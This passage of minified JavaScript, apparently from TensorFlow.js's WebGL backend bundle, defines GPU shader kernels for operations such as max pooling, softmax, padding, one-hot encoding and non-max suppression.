getChannel(xFragAtCurrentDepth, vec2(c, idx.y));\n              if(hasNextRow){\n                z.w = getChannel(xFragAtCurrentDepth, vec2(c + 1, idx.y));\n              }\n            }\n            cache.xy = z.yw;\n            sum += z * z;\n          }\n        }\n        vec4 result = xAtOutputCoords * ${c};\n        setOutput(result);\n      }\n    `
        }
    }
    const vK = {
        kernelName: Ba,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {depthRadius: r, bias: i, alpha: a, beta: c} = s
              , l = z().getBool("WEBGL_PACK_NORMALIZATION") ? new CK(o.shape,r,i,a,c) : new wK(o.shape,r,i,a,c);
            return e.runWebGLProgram(l, [o], o.dtype)
        }
    };
    class SK {
        constructor(t, e, s, o, r) {
            this.variableNames = ["inputImage", "outputImage", "dy"],
            this.outputShape = [],
            this.outputShape = t,
            this.depth = t[3],
            this.depthRadius = e,
            this.bias = s,
            this.alpha = o,
            this.beta = r,
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int r = coords[1];\n        int c = coords[2];\n\n        float result = 0.0;\n        for (int d = 0; d < ${this.depth}; ++d) {\n          int depthBegin = int(max(0.0, float(d - ${e})));\n          int depthEnd = int(min(float(${this.depth}),\n              float(d + ${e} + 1)));\n\n          const int MIN_DEPTH_BEGIN = 0;\n          const int MAX_DEPTH_END = ${this.depth};\n\n          float norm = 0.0;\n          for (int k = MIN_DEPTH_BEGIN; k < MAX_DEPTH_END; ++k) {\n            if (k < depthBegin){\n              continue;\n            }\n            else if (k >= depthBegin && k < depthEnd) {\n              norm += getInputImage(b, r, c, k) * getInputImage(b, r, c, k);\n            }\n            else {\n              break;\n            }\n          }\n\n          norm = float(${o}) * norm + float(${s});\n\n          for(int k = MIN_DEPTH_BEGIN; k < MAX_DEPTH_END; ++k){\n            if (k < depthBegin){\n              continue;\n            }\n            else if (k >= depthBegin && k < depthEnd){\n              float dyi = -2.0 * float(${o})\n                * float(${r})\n                * getInputImage(b, r, c, k) * getOutputImage(b, r, c, d)\n                / norm;\n              if (k == d) {\n                dyi += pow(norm, -1.0 * ${r});\n              }\n              if (k == coords[3]) {\n                dyi *= getDy(b, r, c, d);\n                result += dyi;\n              }\n            }\n            else {\n              break;\n            }\n          }\n      }\n      setOutput(result);\n      }\n    `
        }
    }
    const kK = {
        kernelName: Ru,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, y: r, dy: i} = t
              , {depthRadius: a, bias: c, alpha: l, beta: u} = s
              , d = new SK(o.shape,a,c,l,u);
            return e.runWebGLProgram(d, [o, r, i], o.dtype)
        }
    };
    function hI(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {reductionIndices: r, keepDims: i} = s
          , a = o.shape.length
          , c = It(r, o.shape);
        let l = c;
        const u = Yt(l, a)
          , d = null != u
          , h = e.shouldExecuteOnCPU([o]);
        let p = o;
        if (d) {
            if (h) {
                const I = e.texData.get(p.dataId).values
                  , y = new Array(a);
                for (let k = 0; k < y.length; k++)
                    y[k] = o.shape[u[k]];
                const w = Gp(I, o.shape, o.dtype, u, y);
                p = e.makeTensorInfo(y, o.dtype);
                e.texData.get(p.dataId).values = w
            } else
                p = $l(o, u, e);
            l = ee(l.length, a)
        }
        Ie("max", l, a);
        const [f,m] = me(p.shape, l);
        let b, g = f;
        if (i && (g = re(f, c)),
        h) {
            const I = e.texData.get(p.dataId).values
              , y = dz(I, Z(m), g, o.dtype);
            b = e.makeTensorInfo(g, o.dtype);
            e.texData.get(b.dataId).values = y
        } else
            b = function TK(n, t, e, s) {
                const o = Z(t)
                  , a = tt({
                    inputs: {
                        x: n
                    },
                    attrs: {
                        shape: [Z(n.shape) / o, o]
                    },
                    backend: s
                })
                  , c = No(a, n.dtype, "max", s)
                  , l = tt({
                    inputs: {
                        x: c
                    },
                    attrs: {
                        shape: e
                    },
                    backend: s
                });
                return s.disposeIntermediateTensorInfo(a),
                s.disposeIntermediateTensorInfo(c),
                l
            }(p, m, g, e);
        return d && e.disposeIntermediateTensorInfo(p),
        b
    }
    const NK = {
        kernelName: Ha,
        backendName: "webgl",
        kernelFunc: hI
    }
      , GK = Ce({
        opSnippet: Lp + "\n  return max(a, b);\n",
        packedOpSnippet: "\n  vec4 result = vec4(max(a, b));\n  bvec4 isNaNA = isnan(a);\n  bvec4 isNaNB = isnan(b);\n  bvec4 isNaN = bvec4(isNaNA.x || isNaNB.x, isNaNA.y || isNaNB.y, isNaNA.z || isNaNB.z, isNaNA.w || isNaNB.w);\n  " + To + "\n  return result;\n",
        cpuKernelImpl: hz
    })
      , LK = {
        kernelName: Yr,
        backendName: "webgl",
        kernelFunc: GK
    };
    const DK = {
        kernelName: _a,
        backendName: "webgl",
        kernelFunc: function EK(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t;
            ra(o, "maxPool");
            const {filterSize: r, strides: i, pad: a, dimRoundingMode: c} = s;
            v(Te(i, 1), (()=>`Error in maxPool: Either strides or dilations must be 1. Got strides ${i} and dilations '1'`));
            const u = pn(o.shape, r, i, 1, a, c);
            if (1 === u.filterWidth && 1 === u.filterHeight && Rt(u.inShape, u.outShape))
                return Je({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            const d = new ca(u,"max",!1);
            return e.runWebGLProgram(d, [o], o.dtype)
        }
    };
    const MK = {
        kernelName: Ua,
        backendName: "webgl",
        kernelFunc: function WK(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {filterSize: r, strides: i, pad: a, dataFormat: c, dimRoundingMode: l} = s
              , d = ss(o.shape, r, i, [1, 1, 1], a, l, c)
              , h = new Dp(d,"max",!1);
            return e.runWebGLProgram(h, [o], o.dtype)
        }
    };
    class VK {
        constructor(t) {
            this.variableNames = ["dy", "maxPos"],
            this.outputShape = t.inShape;
            const e = t.strideHeight
              , s = t.strideWidth
              , o = t.dilationHeight
              , r = t.effectiveFilterHeight
              , i = t.effectiveFilterWidth
              , a = r - 1 - t.padInfo.top
              , c = i - 1 - t.padInfo.left
              , l = r * i - 1;
            this.userCode = `\n      const ivec2 pads = ivec2(${a}, ${c});\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n\n        ivec2 dyRCCorner = coords.yz - pads;\n        int dyRCorner = dyRCCorner.x;\n        int dyCCorner = dyRCCorner.y;\n\n        // Convolve dy(?, ?, d) with pos mask(:, :, d) to get dx(xR, xC, d).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < ${r};\n          wR += ${o}) {\n          float dyR = float(dyRCorner + wR) / ${e}.0;\n\n          if (dyR < 0.0 || dyR >= ${t.outHeight}.0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          for (int wC = 0; wC < ${i}; wC++) {\n            float dyC = float(dyCCorner + wC) / ${s}.0;\n\n            if (dyC < 0.0 || dyC >= ${t.outWidth}.0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            float dyValue = getDy(b, idyR, idyC, d);\n            int maxPosValue = ${l} - int(getMaxPos(b, idyR, idyC, d));\n\n            // Get the current value, check it against the value from the\n            // position matrix.\n            int curPosValue = wR * ${i} + wC;\n            float mask = float(maxPosValue == curPosValue ? 1.0 : 0.0);\n\n            dotProd += dyValue * mask;\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class FK {
        constructor(t) {
            this.variableNames = ["dy", "maxPos"],
            this.outputShape = t.inShape;
            const e = t.strideDepth
              , s = t.strideHeight
              , o = t.strideWidth
              , r = t.dilationDepth
              , i = t.dilationHeight
              , a = t.dilationWidth
              , c = t.effectiveFilterDepth
              , l = t.effectiveFilterHeight
              , u = t.effectiveFilterWidth
              , d = c - 1 - t.padInfo.front
              , h = l - 1 - t.padInfo.top
              , p = u - 1 - t.padInfo.left
              , f = c * l * u - 1;
            this.userCode = `\n      const ivec3 pads = ivec3(${d}, ${h}, ${p});\n\n      void main() {\n        ivec5 coords = getOutputCoords();\n        int batch = coords.x;\n        int ch = coords.u;\n\n        ivec3 dyCorner = ivec3(coords.y, coords.z, coords.w) - pads;\n        int dyDCorner = dyCorner.x;\n        int dyRCorner = dyCorner.y;\n        int dyCCorner = dyCorner.z;\n\n        // Convolve dy(?, ?, ?, ch) with pos mask(:, :, :, d) to get\n        // dx(xD, xR, xC, ch).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n\n        for (int wD = 0; wD < ${c};\n           wD += ${r}) {\n          float dyD = float(dyDCorner + wD) / ${e}.0;\n\n          if (dyD < 0.0 || dyD >= ${t.outDepth}.0 || fract(dyD) > 0.0) {\n            continue;\n          }\n          int idyD = int(dyD);\n\n          for (int wR = 0; wR < ${l};\n              wR += ${i}) {\n            float dyR = float(dyRCorner + wR) / ${s}.0;\n\n            if (dyR < 0.0 || dyR >= ${t.outHeight}.0 ||\n                fract(dyR) > 0.0) {\n              continue;\n            }\n            int idyR = int(dyR);\n\n            for (int wC = 0; wC < ${u};\n                wC += ${a}) {\n              float dyC = float(dyCCorner + wC) / ${o}.0;\n\n              if (dyC < 0.0 || dyC >= ${t.outWidth}.0 ||\n                  fract(dyC) > 0.0) {\n                continue;\n              }\n              int idyC = int(dyC);\n\n              float dyValue = getDy(batch, idyD, idyR, idyC, ch);\n              int maxPosValue = ${f} -\n                  int(getMaxPos(batch, idyD, idyR, idyC, ch));\n\n              // Get the current value, check it against the value from the\n              // position matrix.\n              int curPosValue =\n                  wD * ${l} * ${u} +\n                  wR * ${u} + wC;\n              float mask = float(maxPosValue == curPosValue ? 1.0 : 0.0);\n\n              dotProd += dyValue * mask;\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    const XK = {
        kernelName: Gu,
        backendName: "webgl",
        kernelFunc: function zK(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r} = t
              , i = r
              , {filterSize: a, strides: c, pad: l, dimRoundingMode: u} = s
              , h = ss(i.shape, a, c, [1, 1, 1], l, u)
              , p = new Dp(h,"max",!0)
              , f = e.runWebGLProgram(p, [i], i.dtype)
              , m = new FK(h)
              , g = e.runWebGLProgram(m, [o, f], i.dtype);
            return e.disposeIntermediateTensorInfo(f),
            g
        }
    };
    const PK = {
        kernelName: $u,
        backendName: "webgl",
        kernelFunc: function AK(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r, output: i} = t
              , a = r;
            ra([r, i], "maxPoolGrad");
            const {filterSize: c, strides: l, pad: u, dimRoundingMode: d} = s
              , h = pn(a.shape, c, l, 1, u, d)
              , f = new ca(h,"max",!0)
              , m = e.runWebGLProgram(f, [a], a.dtype)
              , g = new VK(h)
              , b = e.runWebGLProgram(g, [o, m], a.dtype);
            return e.disposeIntermediateTensorInfo(m),
            b
        }
    };
    const KK = {
        kernelName: Cf,
        backendName: "webgl",
        kernelFunc: ({inputs: n, attrs: t, backend: e})=>{
            const {x: s} = n
              , {filterSize: o, strides: r, pad: i, includeBatchInIndex: a} = t
              , c = e;
            v(4 === s.shape.length, (()=>`Error in maxPool: input must be rank 4 but got rank ${s.shape.length}.`));
            const l = [1, 1];
            v(Te(r, l), (()=>`Error in maxPool: Either strides or dilations must be 1. Got strides ${r} and dilations '${l}'`));
            const u = pn(s.shape, o, r, l, i)
              , [d,h] = function OK(n, t, e, s) {
                let o = new ca(e,"max",!1);
                const r = s.runWebGLProgram(o, [n], "float32");
                return o = new ca(e,"max",!0,!0,t),
                [r, s.runWebGLProgram(o, [n], "float32")]
            }(s, a, u, c);
            return [d, h]
        }
    };
    const BK = {
        kernelName: Ya,
        backendName: "webgl",
        kernelFunc: ({inputs: n, attrs: t, backend: e})=>{
            const {x: s} = n
              , {keepDims: o, axis: r} = t
              , i = e
              , a = s.shape.length
              , c = It(r, s.shape);
            let l = c;
            const u = Yt(l, a)
              , d = null != u
              , h = i.shouldExecuteOnCPU([s])
              , p = [];
            let f = s;
            if (d) {
                if (h) {
                    const y = i.texData.get(f.dataId).values
                      , w = new Array(a);
                    for (let S = 0; S < w.length; S++)
                        w[S] = s.shape[u[S]];
                    const C = Gp(y, s.shape, s.dtype, u, w);
                    f = i.makeTensorInfo(w, s.dtype);
                    i.texData.get(f.dataId).values = C
                } else
                    f = $l(s, u, i);
                p.push(f),
                l = ee(l.length, a)
            }
            Ie("sum", l, a);
            const [m,g] = me(f.shape, l);
            let b = m;
            o && (b = re(m, c));
            const x = function ZK(n, t, e, s) {
                const o = Z(t)
                  , a = tt({
                    inputs: {
                        x: n
                    },
                    attrs: {
                        shape: [Z(n.shape) / o, o]
                    },
                    backend: s
                })
                  , c = No(a, "float32", "mean", s)
                  , l = tt({
                    inputs: {
                        x: c
                    },
                    attrs: {
                        shape: e
                    },
                    backend: s
                });
                return s.disposeIntermediateTensorInfo(a),
                s.disposeIntermediateTensorInfo(c),
                l
            }(f, g, b, i);
            for (const I of p)
                i.disposeIntermediateTensorInfo(I);
            return x
        }
    };
    const _K = {
        kernelName: Qa,
        backendName: "webgl",
        kernelFunc: function HK(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s
              , a = o.shape.length
              , c = It(r, o.shape);
            let l = c;
            const u = Yt(l, a);
            let d = o;
            null != u && (d = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: u
                }
            }),
            l = ee(l.length, o.shape.length)),
            Ie("min", l, a);
            const [h,p] = me(d.shape, l)
              , m = tt({
                inputs: {
                    x: d
                },
                backend: e,
                attrs: {
                    shape: [-1, Z(p)]
                }
            })
              , g = No(m, m.dtype, "min", e);
            let b;
            if (i) {
                b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: re(h, c)
                    }
                })
            } else
                b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: h
                    }
                });
            return e.disposeIntermediateTensorInfo(m),
            e.disposeIntermediateTensorInfo(g),
            null != u && e.disposeIntermediateTensorInfo(d),
            b
        }
    }
      , QK = Ce({
        opSnippet: Lp + "\n  return min(a, b);\n",
        packedOpSnippet: "\n  vec4 result = vec4(min(a, b));\n  bvec4 isNaNA = isnan(a);\n  bvec4 isNaNB = isnan(b);\n  bvec4 isNaN = bvec4(isNaNA.x || isNaNB.x, isNaNA.y || isNaNB.y, isNaNA.z || isNaNB.z, isNaNA.w || isNaNB.w);\n  " + To + "\n  return result;\n",
        cpuKernelImpl: pz
    })
      , JK = {
        kernelName: Qr,
        backendName: "webgl",
        kernelFunc: QK
    };
    class jK {
        constructor(t, e, s) {
            this.variableNames = ["x"],
            this.outputShape = e.map(((u,d)=>u[0] + t[d] + u[1]));
            const o = t.length
              , r = Wt(o)
              , i = e.map((u=>u[0])).join(",")
              , a = e.map(((u,d)=>u[0] + t[d])).join(",")
              , c = ["coords[0]", "coords[1]", "coords[2]", "coords[3]"].slice(0, o)
              , l = "reflect" === s ? 0 : 1;
            this.userCode = 1 !== o ? `\n      ${r} start = ${r}(${i});\n      ${r} end = ${r}(${a});\n\n      void main() {\n        ${r} outC = getOutputCoords();\n        for (int i = 0; i < ${o}; i++) {\n          if (outC[i] < start[i]) {\n            outC[i] = start[i] * 2 - outC[i] - ${l};\n          } else if(outC[i] >= end[i]) {\n            outC[i] = (end[i] - 1) * 2 - outC[i] + ${l};\n          }\n        }\n        ${r} coords = outC - start;\n        setOutput(getX(${c}));\n      }\n    ` : `\n        int start = ${i};\n        int end = ${a};\n\n        void main() {\n          int outC = getOutputCoords();\n          if (outC < start) {\n            outC = start * 2 - outC - ${l};\n          } else if(outC >= end) {\n            outC = (end - 1) * 2 - outC + ${l};\n          }\n          setOutput(getX(outC - start));\n        }\n      `
        }
    }
    class qK {
        constructor(t, e, s) {
            this.variableNames = ["x"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = e.map(((f,m)=>f[0] + t[m] + f[1]));
            const o = t.length
              , r = Wt(o)
              , i = e.map((f=>f[0])).join(",")
              , a = e.map(((f,m)=>f[0] + t[m])).join(",")
              , c = We("rc", o)
              , l = We("source", o)
              , u = `${c[o - 1]} < ${this.outputShape[o - 1]}`
              , d = 1 === o ? "source" : `vec2(${l.slice(-2).join()})`
              , h = "reflect" === s ? 0 : 1;
            let p = "";
            if (1 === o) {
                const f = `\n        ${r} source = rc;\n        if (source < start) {\n          source = start * 2 - source - ${h};\n        } else if (source >= end) {\n          source = (end - 1) * 2 - source + ${h};\n        }\n        source -= start;\n      `;
                p = `\n        ${r} rc = outputLoc;\n        ${f}\n        result[0] = getChannel(getX(${l.join()}), ${d});\n        ${c[o - 1]} += 1;\n        if(${u}) {\n          ${f}\n          result[1] = getChannel(getX(${l.join()}), ${d});\n        }\n      `
            } else {
                const f = `\n        ${r} source = rc;\n        ${r} lt = ${r}(lessThan(source, start));\n        ${r} gte = ${r}(greaterThanEqual(source, end));\n        ${r} orig = 1 - (lt + gte);\n        source = orig * source +\n                lt * (start * 2 - source - ${h}) +\n                gte * ((end - 1) * 2 - source + ${h});\n        source -= start;\n      `;
                p = `\n        ${r} rc = outputLoc;\n        ${f}\n        result[0] = getChannel(getX(${l.join()}), ${d});\n        ${c[o - 1]} += 1;\n        if(${u}) {\n          ${f}\n          result[1] = getChannel(getX(${l.join()}), ${d});\n        }\n        rc = outputLoc;\n        ${c[o - 2]} += 1;\n        if(${c[o - 2]} < ${this.outputShape[o - 2]}) {\n          ${f}\n          result[2] = getChannel(getX(${l.join()}), ${d});\n          ${c[o - 1]} += 1;\n          if(${u}) {\n            ${f}\n            result[3] = getChannel(getX(${l.join()}), ${d});\n          }\n        }\n      `
            }
            this.userCode = `\n      const ${r} start = ${r}(${i});\n      const ${r} end = ${r}(${a});\n\n      void main() {\n        ${r} outputLoc = getOutputCoords();\n        vec4 result = vec4(0.);\n        ${p}\n        setOutput(result);\n      }\n    `
        }
    }
    const tZ = {
        kernelName: Ja,
        backendName: "webgl",
        kernelFunc: ({inputs: n, backend: t, attrs: e})=>{
            const {x: s} = n
              , {paddings: o, mode: r} = e
              , i = z().getBool("WEBGL_PACK_ARRAY_OPERATIONS") ? new qK(s.shape,o,r) : new jK(s.shape,o,r);
            return t.runWebGLProgram(i, [s], s.dtype)
        }
    }
      , sZ = Ce({
        opSnippet: "if (b == 0.0) return NAN;\n  return mod(a, b);",
        packedOpSnippet: "\n  vec4 result = mod(a, b);\n  bvec4 isNaN = equal(b, vec4(0.0));\n  " + To + "\n  return result;\n"
    })
      , oZ = {
        kernelName: Jr,
        backendName: "webgl",
        kernelFunc: sZ
    };
    class rZ {
        constructor(t, e, s) {
            this.variableNames = ["probs"],
            this.customUniforms = [{
                name: "seed",
                type: "float"
            }],
            this.outputShape = [t, s],
            this.userCode = `\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n\n        float r = random(seed);\n        float cdf = 0.0;\n\n        for (int i = 0; i < ${e - 1}; i++) {\n          cdf += getProbs(batch, i);\n\n          if (r < cdf) {\n            setOutput(float(i));\n            return;\n          }\n        }\n\n        // If no other event happened, last event happened.\n        setOutput(float(${e - 1}));\n      }\n    `
        }
    }
    const pI = Ce({
        opSnippet: "\nif (a == b) {\n  return 1.0;\n};\nreturn a / b;",
        packedOpSnippet: "\n  // vec4 one = vec4(equal(a, b));\n  // return one + (vec4(1.0) - one) * a / b;\n  vec4 result = a / b;\n  if(a.x == b.x) {\n    result.x = 1.;\n  }\n  if(a.y == b.y) {\n    result.y = 1.;\n  }\n  if(a.z == b.z) {\n    result.z = 1.;\n  }\n  if(a.w == b.w) {\n    result.w = 1.;\n  }\n\n  return result;\n",
        checkOutOfBounds: !0
    })
      , iZ = {
        kernelName: Mr,
        backendName: "webgl",
        kernelFunc: pI
    }
      , fI = "return a - b;"
      , mI = Ce({
        opSnippet: fI,
        packedOpSnippet: fI,
        supportsComplex: !0,
        cpuKernelImpl: Wz
    })
      , aZ = {
        kernelName: pi,
        backendName: "webgl",
        kernelFunc: mI
    };
    function gI(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {logits: o} = t
          , {dim: r} = s
          , i = It([r], o.shape)
          , a = hI({
            inputs: {
                x: o
            },
            backend: e,
            attrs: {
                reductionIndices: i,
                keepDims: !1
            }
        })
          , c = re(a.shape, i)
          , l = tt({
            inputs: {
                x: a
            },
            backend: e,
            attrs: {
                shape: c
            }
        })
          , u = mI({
            inputs: {
                a: o,
                b: l
            },
            backend: e
        })
          , d = iI({
            inputs: {
                x: u
            },
            backend: e
        })
          , h = Gl({
            inputs: {
                x: d
            },
            backend: e,
            attrs: {
                axis: i,
                keepDims: !1
            }
        })
          , p = tt({
            inputs: {
                x: h
            },
            backend: e,
            attrs: {
                shape: c
            }
        })
          , f = pI({
            inputs: {
                a: d,
                b: p
            },
            backend: e
        });
        return e.disposeIntermediateTensorInfo(a),
        e.disposeIntermediateTensorInfo(l),
        e.disposeIntermediateTensorInfo(u),
        e.disposeIntermediateTensorInfo(d),
        e.disposeIntermediateTensorInfo(h),
        e.disposeIntermediateTensorInfo(p),
        f
    }
    const cZ = {
        kernelName: mc,
        backendName: "webgl",
        kernelFunc: gI
    };
    const uZ = {
        kernelName: vf,
        backendName: "webgl",
        kernelFunc: function lZ(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {logits: o} = t
              , {numSamples: r, seed: i, normalized: a} = s
              , c = a ? o : gI({
                inputs: {
                    logits: o
                },
                backend: e,
                attrs: {
                    dim: o.shape.length - 1
                }
            })
              , l = c.shape[0]
              , u = c.shape[1]
              , d = new rZ(l,u,r)
              , h = [[i]]
              , p = e.runWebGLProgram(d, [c], "int32", h);
            return a || e.disposeIntermediateTensorInfo(c),
            p
        }
    }
      , dZ = Cn + "\n  return -x;\n";
    const fZ = {
        kernelName: ja,
        backendName: "webgl",
        kernelFunc: function pZ(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t;
            if (e.shouldExecuteOnCPU([s])) {
                const r = e.texData.get(s.dataId)
                  , [i,a] = mz(r.values, s.shape, s.dtype);
                return e.makeTensorInfo(a, s.dtype, i)
            }
            let o;
            return o = z().getBool("WEBGL_PACK_UNARY_OPERATIONS") ? new Fs(s.shape,"\n  vec4 result = -x;\n  bvec4 isNaN = isnan(x);\n\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n") : new jn(s.shape,dZ),
            e.runWebGLProgram(o, [s], s.dtype)
        }
    }
      , mZ = Hd;
    const bZ = {
        kernelName: Lu,
        backendName: "webgl",
        kernelFunc: function gZ(n) {
            je("tf.nonMaxSuppression() in webgl locks the UI thread. Call tf.nonMaxSuppressionAsync() instead");
            const {inputs: t, backend: e, attrs: s} = n
              , {boxes: o, scores: r} = t
              , {maxOutputSize: i, iouThreshold: a, scoreThreshold: c} = s
              , l = e.readSync(o.dataId)
              , u = e.readSync(r.dataId)
              , {selectedIndices: d} = mZ(l, u, i, a, c);
            return e.makeTensorInfo([d.length], "int32", new Int32Array(d))
        }
    }
      , xZ = _d;
    const IZ = {
        kernelName: Eu,
        backendName: "webgl",
        kernelFunc: function yZ(n) {
            je("tf.nonMaxSuppression() in webgl locks the UI thread. Call tf.nonMaxSuppressionAsync() instead");
            const {inputs: t, backend: e, attrs: s} = n
              , {boxes: o, scores: r} = t
              , {maxOutputSize: i, iouThreshold: a, scoreThreshold: c, padToMaxOutputSize: l} = s
              , u = e.readSync(o.dataId)
              , d = e.readSync(r.dataId)
              , {selectedIndices: h, validOutputs: p} = xZ(u, d, i, a, c, l);
            return [e.makeTensorInfo([h.length], "int32", new Int32Array(h)), e.makeTensorInfo([], "int32", new Int32Array([p]))]
        }
    }
      , wZ = Ud;
    const vZ = {
        kernelName: Du,
        backendName: "webgl",
        kernelFunc: function CZ(n) {
            je("tf.nonMaxSuppression() in webgl locks the UI thread. Call tf.nonMaxSuppressionAsync() instead");
            const {inputs: t, backend: e, attrs: s} = n
              , {boxes: o, scores: r} = t
              , {maxOutputSize: i, iouThreshold: a, scoreThreshold: c, softNmsSigma: l} = s
              , u = e.readSync(o.dataId)
              , d = e.readSync(r.dataId)
              , h = i
              , p = a
              , f = c
              , m = l
              , {selectedIndices: g, selectedScores: b} = wZ(u, d, h, p, f, m);
            return [e.makeTensorInfo([g.length], "int32", new Int32Array(g)), e.makeTensorInfo([b.length], "float32", new Float32Array(b))]
        }
    };
    class SZ {
        constructor(t, e, s, o) {
            this.variableNames = ["indices"],
            this.outputShape = [t, e],
            this.userCode = `\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int index = round(getIndices(coords.x));\n        setOutput(mix(float(${o}), float(${s}),\n                      float(index == coords.y)));\n      }\n    `
        }
    }
    const kZ = {
        kernelName: ec,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e, attrs: s} = n
              , {indices: o} = t
              , {dtype: r, depth: i, onValue: a, offValue: c} = s
              , l = Z(o.shape)
              , u = new SZ(l,i,a,c)
              , d = tt({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: [l]
                }
            })
              , h = e.runWebGLProgram(u, [d], r);
            e.disposeIntermediateTensorInfo(d);
            const f = tt({
                inputs: {
                    x: h
                },
                backend: e,
                attrs: {
                    shape: [...o.shape, i]
                }
            });
            return e.disposeIntermediateTensorInfo(h),
            f
        }
    };
    function Vl(n) {
        const {inputs: t, backend: e} = n
          , {x: s} = t;
        if ("complex64" === s.dtype) {
            const o = la({
                inputs: {
                    input: s
                },
                backend: e
            })
              , r = Vl({
                inputs: {
                    x: o
                },
                backend: e
            })
              , i = Wl({
                inputs: {
                    input: s
                },
                backend: e
            })
              , a = Vl({
                inputs: {
                    x: i
                },
                backend: e
            })
              , c = zs({
                inputs: {
                    real: r,
                    imag: a
                },
                backend: e
            });
            return e.disposeIntermediateTensorInfo(o),
            e.disposeIntermediateTensorInfo(r),
            e.disposeIntermediateTensorInfo(i),
            e.disposeIntermediateTensorInfo(a),
            c
        }
        return ha({
            attrs: {
                shape: s.shape,
                dtype: s.dtype,
                value: "string" === s.dtype ? "" : 0
            },
            backend: e
        })
    }
    const TZ = {
        kernelName: xc,
        backendName: "webgl",
        kernelFunc: Vl
    };
    const NZ = {
        kernelName: tc,
        backendName: "webgl",
        kernelFunc: function bI(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t;
            if ("string" === s.dtype)
                throw new Error("onesLike is not supported under string dtype");
            if ("complex64" === s.dtype) {
                const o = la({
                    inputs: {
                        input: s
                    },
                    backend: e
                })
                  , r = bI({
                    inputs: {
                        x: o
                    },
                    backend: e
                })
                  , i = Wl({
                    inputs: {
                        input: s
                    },
                    backend: e
                })
                  , a = Vl({
                    inputs: {
                        x: i
                    },
                    backend: e
                })
                  , c = zs({
                    inputs: {
                        real: r,
                        imag: a
                    },
                    backend: e
                });
                return e.disposeIntermediateTensorInfo(o),
                e.disposeIntermediateTensorInfo(r),
                e.disposeIntermediateTensorInfo(i),
                e.disposeIntermediateTensorInfo(a),
                c
            }
            return ha({
                attrs: {
                    shape: s.shape,
                    dtype: s.dtype,
                    value: 1
                },
                backend: e
            })
        }
    };
    const $Z = {
        kernelName: nc,
        backendName: "webgl",
        kernelFunc: function RZ(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {axis: o} = s;
            if (1 === t.length)
                return Vp({
                    inputs: {
                        input: t[0]
                    },
                    backend: e,
                    attrs: {
                        dim: o
                    }
                });
            const r = t[0].shape
              , i = t[0].dtype;
            t.forEach((u=>{
                Hl(r, u.shape, "All tensors passed to stack must have matching shapes"),
                v(i === u.dtype, (()=>"All tensors passed to stack must have matching dtypes"))
            }
            ));
            const a = []
              , l = Y1({
                inputs: t.map((u=>{
                    const d = Vp({
                        inputs: {
                            input: u
                        },
                        backend: e,
                        attrs: {
                            dim: o
                        }
                    });
                    return a.push(d),
                    d
                }
                )),
                backend: e,
                attrs: {
                    axis: o
                }
            });
            return a.forEach((u=>e.disposeIntermediateTensorInfo(u))),
            l
        }
    };
    class GZ {
        constructor(t, e, s) {
            this.variableNames = ["x"],
            this.customUniforms = [{
                name: "value",
                type: "float"
            }],
            this.outputShape = e.map(((l,u)=>l[0] + t[u] + l[1]));
            const o = t.length
              , r = Wt(o)
              , i = e.map((l=>l[0])).join(",")
              , a = e.map(((l,u)=>l[0] + t[u])).join(",")
              , c = ["coords[0]", "coords[1]", "coords[2]", "coords[3]"].slice(0, o);
            this.userCode = 1 !== o ? `\n      ${r} start = ${r}(${i});\n      ${r} end = ${r}(${a});\n\n      void main() {\n        ${r} outC = getOutputCoords();\n        if (any(lessThan(outC, start)) || any(greaterThanEqual(outC, end))) {\n          setOutput(value);\n        } else {\n          ${r} coords = outC - start;\n          setOutput(getX(${c}));\n        }\n      }\n    ` : `\n        int start = ${i};\n        int end = ${a};\n\n        void main() {\n          int outC = getOutputCoords();\n          if (outC < start || outC >= end) {\n            setOutput(value);\n          } else {\n            setOutput(getX(outC - start));\n          }\n        }\n      `
        }
    }
    class LZ {
        constructor(t, e, s) {
            this.variableNames = ["x"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "value",
                type: "float"
            }],
            this.outputShape = e.map(((m,g)=>m[0] + t[g] + m[1]));
            const o = t.length
              , r = Wt(o)
              , i = e.map((m=>m[0])).join(",")
              , a = e.map(((m,g)=>m[0] + t[g])).join(",")
              , c = We("rc", o)
              , l = We("source", o)
